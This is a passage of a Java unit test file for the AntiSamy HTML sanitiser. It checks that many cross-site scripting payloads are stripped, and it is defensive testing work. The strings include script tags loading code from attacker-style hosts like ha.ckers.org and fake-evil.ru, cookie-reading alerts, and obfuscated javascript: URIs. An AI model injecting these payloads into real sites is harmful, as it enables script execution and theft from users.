assertTrue(!as.scan(\"test<script>alert(document.cookie)</script>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"script\"));\n\n        assertTrue(!as.scan(\"<<<><<script src=http://fake-evil.ru/test.js>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<<<><<script src=http://fake-evil.ru/test.js>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<script<script src=http://fake-evil.ru/test.js>>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<script<script src=http://fake-evil.ru/test.js>>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT/XSS SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT/XSS SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<BODY onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\\\"XSS\\\")>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"onload\"));\n        assertTrue(!as.scan(\"<BODY onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=alert(\\\"XSS\\\")>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"onload\"));\n\n        assertTrue(!as.scan(\"<BODY ONLOAD=alert('XSS')>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"alert\"));\n        assertTrue(!as.scan(\"<BODY ONLOAD=alert('XSS')>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"alert\"));\n\n        assertTrue(!as.scan(\"<iframe src=http://ha.ckers.org/scriptlet.html <\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<iframe\"));\n        assertTrue(!as.scan(\"<iframe src=http://ha.ckers.org/scriptlet.html <\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<iframe\"));\n\n        assertTrue(!as.scan(\"<INPUT TYPE=\\\"IMAGE\\\" SRC=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"src\"));\n        assertTrue(!as.scan(\"<INPUT TYPE=\\\"IMAGE\\\" SRC=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"src\"));\n\n        as.scan(\"<a onblur=\\\"alert(secret)\\\" href=\\\"http://www.google.com\\\">Google</a>\", policy, AntiSamy.DOM);\n        as.scan(\"<a onblur=\\\"alert(secret)\\\" href=\\\"http://www.google.com\\\">Google</a>\", policy, AntiSamy.SAX);\n    }\n\n    @Test\n    public void imgAttacks() throws ScanException, PolicyException {\n\n        assertTrue(as.scan(\"<img src=\\\"http://www.myspace.com/img.gif\\\"/>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<img\"));\n        assertTrue(as.scan(\"<img src=\\\"http://www.myspace.com/img.gif\\\"/>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<img\"));\n\n        assertTrue(!as.scan(\"<img src=javascript:alert(document.cookie)>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<img\"));\n        assertTrue(!as.scan(\"<img src=javascript:alert(document.cookie)>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<img\"));\n\n        assertTrue(!as.scan(\"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<img\"));\n        assertTrue(!as.scan(\"<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>\", policy, AntiSamy.SAX)\n                .getCleanHTML().contains(\"<img\"));\n\n        assertTrue(!as.scan(\n                        \"<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>\",\n                        policy, AntiSamy.DOM).getCleanHTML().contains(\"<img\"));\n        assertTrue(!as.scan(\n                        \"<IMG SRC='&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041'>\",\n                        policy, AntiSamy.SAX).getCleanHTML().contains(\"<img\"));\n\n        assertTrue(!as.scan(\"<IMG SRC=\\\"jav&#x0D;ascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"alert\"));\n        assertTrue(!as.scan(\"<IMG SRC=\\\"jav&#x0D;ascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"alert\"));\n\n        String s = as.scan(\n                        \"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\",\n                        policy, AntiSamy.DOM).getCleanHTML();\n        assertTrue(s.length() == 0 || s.contains(\"&amp;\"));\n        s = as.scan( \"<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>\",\n                        policy, AntiSamy.SAX).getCleanHTML();\n        assertTrue(s.length() == 0 || s.contains(\"&amp;\"));\n\n        as.scan(\"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\", policy, AntiSamy.DOM);\n        as.scan(\"<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>\", policy, AntiSamy.SAX);\n\n        assertTrue(!as.scan(\"<IMG SRC=\\\"javascript:alert('XSS')\\\"\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<IMG SRC=\\\"javascript:alert('XSS')\\\"\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<IMG LOWSRC=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<IMG LOWSRC=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<BGSOUND SRC=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<BGSOUND SRC=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n    }\n\n    @Test\n    public void hrefAttacks() throws ScanException, PolicyException {\n\n        assertTrue(!as.scan(\"<LINK REL=\\\"stylesheet\\\" HREF=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"href\"));\n        assertTrue(!as.scan(\"<LINK REL=\\\"stylesheet\\\" HREF=\\\"javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"href\"));\n\n        assertTrue(!as.scan(\"<LINK REL=\\\"stylesheet\\\" HREF=\\\"http://ha.ckers.org/xss.css\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"href\"));\n        assertTrue(!as.scan(\"<LINK REL=\\\"stylesheet\\\" HREF=\\\"http://ha.ckers.org/xss.css\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"href\"));\n\n        assertTrue(!as.scan(\"<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"ha.ckers.org\"));\n        assertTrue(!as.scan(\"<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"ha.ckers.org\"));\n\n        assertTrue(!as.scan(\"<STYLE>BODY{-moz-binding:url(\\\"http://ha.ckers.org/xssmoz.xml#xss\\\")}</STYLE>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"ha.ckers.org\"));\n        assertTrue(!as.scan(\"<STYLE>BODY{-moz-binding:url(\\\"http://ha.ckers.org/xssmoz.xml#xss\\\")}</STYLE>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"ha.ckers.org\"));\n\n        assertTrue(!as.scan(\"<STYLE>li {list-style-image: url(\\\"javascript:alert('XSS')\\\");}</STYLE><UL><LI>XSS\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<STYLE>li {list-style-image: url(\\\"javascript:alert('XSS')\\\");}</STYLE><UL><LI>XSS\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<IMG SRC='vbscript:msgbox(\\\"XSS\\\")'>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"vbscript\"));\n        assertTrue(!as.scan(\"<IMG SRC='vbscript:msgbox(\\\"XSS\\\")'>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"vbscript\"));\n\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0; URL=http://;URL=javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<meta\"));\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0; URL=http://;URL=javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<meta\"));\n\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=javascript:alert('XSS');\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<meta\"));\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=javascript:alert('XSS');\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<meta\"));\n\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<meta\"));\n        assertTrue(!as.scan(\"<META HTTP-EQUIV=\\\"refresh\\\" CONTENT=\\\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<meta\"));\n\n        assertTrue(!as.scan(\"<IFRAME SRC=\\\"javascript:alert('XSS');\\\"></IFRAME>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"iframe\"));\n        assertTrue(!as.scan(\"<IFRAME SRC=\\\"javascript:alert('XSS');\\\"></IFRAME>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"iframe\"));\n\n        assertTrue(!as.scan(\"<FRAMESET><FRAME SRC=\\\"javascript:alert('XSS');\\\"></FRAMESET>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<FRAMESET><FRAME SRC=\\\"javascript:alert('XSS');\\\"></FRAMESET>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<TABLE BACKGROUND=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"background\"));\n        assertTrue(!as.scan(\"<TABLE BACKGROUND=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"background\"));\n\n        assertTrue(!as.scan(\"<TABLE><TD BACKGROUND=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"background\"));\n        assertTrue(!as.scan(\"<TABLE><TD BACKGROUND=\\\"javascript:alert('XSS')\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"background\"));\n\n        assertTrue(!as.scan(\"<DIV STYLE=\\\"background-image: url(javascript:alert('XSS'))\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<DIV STYLE=\\\"background-image: url(javascript:alert('XSS'))\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<DIV STYLE=\\\"width: expression(alert('XSS'));\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"alert\"));\n        assertTrue(!as.scan(\"<DIV STYLE=\\\"width: expression(alert('XSS'));\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"alert\"));\n\n        assertTrue(!as.scan(\"<IMG STYLE=\\\"xss:expr/*XSS*/ession(alert('XSS'))\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"alert\"));\n        assertTrue(!as.scan(\"<IMG STYLE=\\\"xss:expr/*XSS*/ession(alert('XSS'))\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"alert\"));\n\n        assertTrue(!as.scan(\"<STYLE>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\\\"XSS\\\")';</STYLE>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"ript:alert\"));\n        assertTrue(!as.scan(\"<STYLE>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\\\"XSS\\\")';</STYLE>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"ript:alert\"));\n\n        assertTrue(!as.scan(\"<BASE HREF=\\\"javascript:alert('XSS');//\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<BASE HREF=\\\"javascript:alert('XSS');//\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<BaSe hReF=\\\"http://arbitrary.com/\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<base\"));\n        assertTrue(!as.scan(\"<BaSe hReF=\\\"http://arbitrary.com/\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<base\"));\n\n        assertTrue(!as.scan(\"<OBJECT TYPE=\\\"text/x-scriptlet\\\" DATA=\\\"http://ha.ckers.org/scriptlet.html\\\"></OBJECT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<object\"));\n        assertTrue(!as.scan(\"<OBJECT TYPE=\\\"text/x-scriptlet\\\" DATA=\\\"http://ha.ckers.org/scriptlet.html\\\"></OBJECT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<object\"));\n\n        assertTrue(!as.scan(\"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n\n        CleanResults cr = as.scan(\"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>\", policy, AntiSamy.SAX);\n        // System.out.println(cr.getErrorMessages().get(0));\n        assertTrue(!cr.getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<EMBED SRC=\\\"http://ha.ckers.org/xss.swf\\\" AllowScriptAccess=\\\"always\\\"></EMBED>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<embed\"));\n        assertTrue(!as.scan(\"<EMBED SRC=\\\"http://ha.ckers.org/xss.swf\\\" AllowScriptAccess=\\\"always\\\"></EMBED>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<embed\"));\n\n        assertTrue(!as.scan(\n                        \"<EMBED SRC=\\\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\\\" type=\\\"image/svg+xml\\\" AllowScriptAccess=\\\"always\\\"></EMBED>\",\n                        policy, AntiSamy.DOM).getCleanHTML().contains(\"<embed\"));\n        assertTrue(!as.scan(\n                        \"<EMBED SRC=\\\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\\\" type=\\\"image/svg+xml\\\" AllowScriptAccess=\\\"always\\\"></EMBED>\",\n                        policy, AntiSamy.SAX).getCleanHTML().contains(\"<embed\"));\n\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">\\\" SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">\\\" SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">\\\" '' SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">\\\" '' SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT a=`>` SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT a=`>` SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">'>\\\" SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT a=\\\">'>\\\" SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT>document.write(\\\"<SCRI\\\");</SCRIPT>PT SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"script\"));\n        assertTrue(!as.scan(\"<SCRIPT>document.write(\\\"<SCRI\\\");</SCRIPT>PT SRC=\\\"http://ha.ckers.org/xss.js\\\"></SCRIPT>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"script\"));\n\n        assertTrue(!as.scan(\"<SCRIPT SRC=http://ha.ckers.org/xss.js\", policy, AntiSamy.DOM).getCleanHTML().contains(\"<script\"));\n        assertTrue(!as.scan(\"<SCRIPT SRC=http://ha.ckers.org/xss.js\", policy, AntiSamy.SAX).getCleanHTML().contains(\"<script\"));\n\n        assertTrue(!as.scan(\n                        \"<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>\",\n                        policy, AntiSamy.DOM).getCleanHTML().contains(\"style\"));\n        assertTrue(!as.scan(\n                        \"<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>\",\n                        policy, AntiSamy.SAX).getCleanHTML().contains(\"style\"));\n\n        assertTrue(!as.scan(\"<a href='aim: &c:\\\\windows\\\\system32\\\\calc.exe' ini='C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\pwnd.bat'>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"aim.exe\"));\n        assertTrue(!as.scan(\"<a href='aim: &c:\\\\windows\\\\system32\\\\calc.exe' ini='C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\pwnd.bat'>\", policy, AntiSamy.SAX)\n                .getCleanHTML().contains(\"aim.exe\"));\n\n        assertTrue(!as.scan(\"<!--\\n<A href=\\n- --><a href=javascript:alert:document.domain>test-->\", policy, AntiSamy.DOM).getCleanHTML().contains(\"javascript\"));\n        assertTrue(!as.scan(\"<!--\\n<A href=\\n- --><a href=javascript:alert:document.domain>test-->\", policy, AntiSamy.SAX).getCleanHTML().contains(\"javascript\"));\n\n        assertTrue(!as.scan(\"<a></a style=\\\"\\\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"document\"));\n        assertTrue(!as.scan(\"<a></a style=\\\"\\\"xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"document\"));\n    }\n\n    /*\n     * Test CSS protections.\n     */\n\n    @Test\n    public void cssAttacks() throws ScanException, PolicyException {\n\n        assertTrue(!as.scan(\"<div style=\\\"position:absolute\\\">\", policy, AntiSamy.DOM).getCleanHTML().contains(\"position\"));\n        assertTrue(!as.scan(\"<div style=\\\"position:absolute\\\">\", policy, AntiSamy.SAX).getCleanHTML().contains(\"position\"));\n\n        assertTrue(!as.scan(\"<style>b { position:absolute }</style>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"position\"));\n        assertTrue(!as.scan(\"<style>b { position:absolute }</style>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"position\"));\n\n        assertTrue(!as.scan(\"<div style=\\\"z-index:25\\\">test</div>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"z-index\"));\n        assertTrue(!as.scan(\"<div style=\\\"z-index:25\\\">test</div>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"z-index\"));\n\n        assertTrue(!as.scan(\"<style>z-index:25</style>\", policy, AntiSamy.DOM).getCleanHTML().contains(\"z-index\"));\n        assertTrue(!as.scan(\"<style>z-index:25</style>\", policy, AntiSamy.SAX).getCleanHTML().contains(\"z-index\"));\n    }\n\n    /*\n     * Test a bunch of strings that have tweaked the XML parsing capabilities of\n     * NekoHTML.\n     */\n    @Test\n    public void IllegalXML() throws PolicyException {\n\n        for (String BASE64_BAD_XML_STRING : BASE64_BAD_XML_STRINGS) {\n\n            try {\n                String testStr = new String(Base64.decodeBase64(BASE64_BAD_XML_STRING.getBytes()));\n                as.scan(testStr, policy, AntiSamy.DOM);\n                as.scan(testStr, policy, AntiSamy.SAX);\n\n            } catch (ScanException ex) {\n                // still success!\n            }\n        }\n\n        // This fails due to a bug in NekoHTML\n        // try {\n        // assertTrue (\n        // as.scan(\"<a . href=\\\"http://www.test.com\\\">\",policy, AntiSamy.DOM).getCleanHTML().indexOf(\"href\")\n        // != -1 );\n        // } catch (Exception e) {\n        // e.printStackTrace();\n        // fail(\"Couldn't parse malformed HTML: \" + e.getMessage());\n        // }\n\n        // This fails due to a bug in NekoHTML\n        // try {\n        // assertTrue (\n        // as.scan(\"<a - href=\\\"http://www.test.com\\\">\",policy, AntiSamy.DOM).getCleanHTML().indexOf(\"href\")\n        // != -1 );\n        // } catch (Exception e) {\n        // e.printStackTrace();\n        // fail(\"Couldn't parse malformed HTML: \" + e.getMessage());\n        // }\n\n        try {\n            assertTrue(as.scan(\"<style>\", policy, AntiSamy.DOM) != null);\n        } catch (Exception e) {\n            e.printStackTrace();\n            fail(\"Couldn't parse malformed HTML: \" + e.getMessage());\n        }\n    }\n\n    @Test\n    public void issue12() throws ScanException, PolicyException {\n\n        /*\n         * issues 12 (and 36, which was similar). empty tags cause display\n         * problems/\"formjacking\"\n         */\n\n        Pattern p = Pattern.compile(\".*<strong(\\\\s*)/>.*\");\n        String s1 = as.scan(\"<br ><strong></strong><a>hello world</a><b /><i/><hr>\", policy, AntiSamy.DOM).getCleanHTML();\n        String s2 = as.scan(\"<br ><strong></strong><a>hello world</a><b /><i/><hr>\", policy, AntiSamy.SAX).getCleanHTML();\n\n        assertFalse(p.matcher(s1).matches());\n\n        p = Pattern.compile(\".*<b(\\\\s*)/>.*\");\n        assertFalse(p.matcher(s1).matches());\n        assertFalse(p.matcher(s2).matches());\n\n        p = Pattern.compile(\".*<i(\\\\s*)/>.*\");\n        assertFalse(p.matcher(s1).matches());\n        assertFalse(p.matcher(s2).matches());\n\n        assertTrue(s1.contains(\"<hr />\") || s1.contains(\"<hr/>\"));\n        assertTrue(s2.contains(\"<hr />\") || s2.contains(\"<hr/>\"));\n    }\n\n    @Test\n    public void issue20() throws ScanException, PolicyException {\n        String s = as.scan(\"<b><i>Some Text</b></i>\", policy, AntiSamy.DOM).getCleanHTML();\n        assertTrue(!s.contains(\"<i />\"));\n\n        s = as.scan(\"<b><i>Some Text</b></i>\", policy, AntiSamy.SAX).getCleanHTML();\n        assertTrue(!s.contains(\"<i />\"));\n    }\n\n    @Test\n    public void issue25() throws ScanException, PolicyException {\n        String s = \"<div style=\\\"margin: -5em\\\">Test</div>\";\n        String expected = \"<div style=\\\"\\\">Test</div>\";\n\n        String crDom = as.scan(s, policy, AntiSamy.DOM).getCleanHTML();\n        assertEquals(crDom, expected);\n        String crSax = as.scan(s, policy, AntiSamy.SAX).getCleanHTML();\n        assertEquals(crSax, expected);\n    }\n\n\n    @Test\n    public void issue28() throws ScanException, PolicyException {\n        String s1 = as.scan(\"<div style=\\\"font-family: Geneva, Arial, courier new, sans-serif\\\">Test</div>\", policy, AntiSamy.DOM).getCleanHTML();\n        String s2 = as.scan(\"<div style=\\\"font-family: Geneva, Arial, courier new, sans-serif\\\">Test</div>\", policy, AntiSamy.SAX).getCleanHTML();\n        assertTrue(s1.contains(\"font-family\"));\n        assertTrue(s2.contains(\"font-family\"));\n    }\n\n    @Test\n    public void issue29() throws ScanException, PolicyException {\n        /* issue #29 - missing quotes around properties with spaces */\n        String s = \"<style type=\\\"text/css\\\"><![CDATA[P {\\n\tfont-family: \\\"Arial Unicode MS\\\";\\n}\\n]]></style>\";\n        CleanResults cr = as.scan(s, policy, AntiSamy.DOM);\n        assertEquals(s, cr.getCleanHTML());\n    }\n\n    @Test\n    public void issue30() throws ScanException, PolicyException {\n\n        String s = \"<style type=\\\"text/css\\\"><![CDATA[P { margin-bottom: 0.08in; } ]]></style>\";\n\n        as.scan(s, policy, AntiSamy.DOM);\n        CleanResults cr;\n\n        /* followup - does the patch fix multiline CSS? */\n        String s2 = \"<style type=\\\"text/css\\\"><![CDATA[\\r\\nP {\\r\\n margin-bottom: 0.08in;\\r\\n}\\r\\n]]></style>\";\n        cr = as.scan(s2, policy, AntiSamy.DOM);\n        assertEquals(\"<style type=\\\"text/css\\\"><![CDATA[P {\\n\\tmargin-bottom: 0.08in;\\n}\\n]]></style>\", cr.getCleanHTML());\n\n        /* next followup - does non-CDATA parsing still work? */\n\n        String s3 = \"<style>P {\\n\\tmargin-bottom: 0.08in;\\n}\\n\";\n        cr = as.scan(s3, policy.cloneWithDirective(Policy.USE_XHTML, \"false\"), AntiSamy.DOM);\n        assertEquals(\"<style>P {\\n\\tmargin-bottom: 0.08in;\\n}\\n</style>\\n\", cr.getCleanHTML());\n    }\n\n    @Test\n    public void issue31() throws ScanException, PolicyException {\n\n        String test = \"<b><u><g>foo</g></u></b>\";\n        Policy revised = policy.cloneWithDirective(\"onUnknownTag\", \"encode\");\n        CleanResults cr = as.scan(test, revised, AntiSamy.DOM);\n        String s = cr.getCleanHTML();\n        assertFalse(!s.contains(\"&lt;g&gt;\"));\n        assertFalse(!s.contains(\"&lt;/g&gt;\"));\n        s = as.scan(test, revised, AntiSamy.SAX).getCleanHTML();\n        assertFalse(!s.contains(\"&lt;g&gt;\"));\n        